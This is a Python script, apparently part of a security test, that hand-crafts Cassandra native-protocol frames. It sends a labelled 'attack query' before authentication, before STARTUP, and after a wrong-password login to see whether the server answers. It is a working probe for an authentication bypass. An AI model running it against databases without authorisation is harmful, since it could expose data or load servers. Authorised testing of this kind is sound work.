#!/usr/bin/env python3
# 3-b confirm R24 (from C10's preauth.py, attack query changed): pre-auth probe with hand-made native-protocol v4 frames (no driver). Sends STARTUP, then the attack
# query (QUERY and PREPARE) before any AUTH_RESPONSE, then a wrong-password AUTH_RESPONSE, and prints each reply.
#   preauth.py <host> [port=9042]
import socket, struct, sys
H = sys.argv[1]; P = int(sys.argv[2]) if len(sys.argv) > 2 else 9042
OPS = {0: 'ERROR', 2: 'READY', 3: 'AUTHENTICATE', 6: 'SUPPORTED', 8: 'RESULT', 0x0E: 'AUTH_CHALLENGE', 0x10: 'AUTH_SUCCESS'}
Q = "SELECT k, c, v, pad FROM r24.w2k WHERE v = 'x' ALLOW FILTERING"
def s_(x): b = x.encode(); return struct.pack('>H', len(b)) + b
def ls_(x): b = x.encode(); return struct.pack('>i', len(b)) + b
def frame(stream, op, body): return struct.pack('>BBhBi', 4, 0, stream, op, len(body)) + body
def recv(sock):
    h = b''
    while len(h) < 9: h += sock.recv(9 - len(h))
    _, _, st, op, n = struct.unpack('>BBhBi', h); b = b''
    while len(b) < n: b += sock.recv(n - len(b))
    if op == 0:
        code = struct.unpack('>i', b[:4])[0]; ml = struct.unpack('>H', b[4:6])[0]
        return f'ERROR code=0x{code:04X} msg="{b[6:6 + ml].decode(errors="replace")}"'
    if op == 3:
        ml = struct.unpack('>H', b[:2])[0]; return f'AUTHENTICATE {b[2:2 + ml].decode()}'
    return f'{OPS.get(op, hex(op))} ({n} B body)'
def run(steps):
    sk = socket.create_connection((H, P), timeout=10)
    for name, fr in steps:
        sk.sendall(fr)
        try: print(f'  {name:42s} -> {recv(sk)}')
        except Exception as e: print(f'  {name:42s} -> no reply / closed ({e.__class__.__name__}: {e})'); break
    sk.close()
startup = frame(1, 1, struct.pack('>H', 1) + s_('CQL_VERSION') + s_('3.0.0'))
query = frame(2, 7, ls_(Q) + struct.pack('>HB', 1, 0))
prep = frame(3, 9, ls_(Q))
opts = frame(4, 5, b'')
tok = b'\x00' + b'attacker' + b'\x00' + b'wrong-password'
authr = frame(5, 0x0F, struct.pack('>i', len(tok)) + tok)
print('connection 1: STARTUP, then QUERY / PREPARE / OPTIONS without authenticating')
run([('STARTUP', startup), ('QUERY (attack query) before AUTH_RESPONSE', query), ('PREPARE (attack query)', prep), ('OPTIONS', opts)])
print('connection 2: QUERY before STARTUP')
run([('QUERY (attack query) before STARTUP', query)])
print('connection 3: STARTUP, AUTH_RESPONSE with a wrong password, then QUERY')
run([('STARTUP', startup), ('AUTH_RESPONSE attacker/wrong-password', authr), ('QUERY (attack query)', query)])
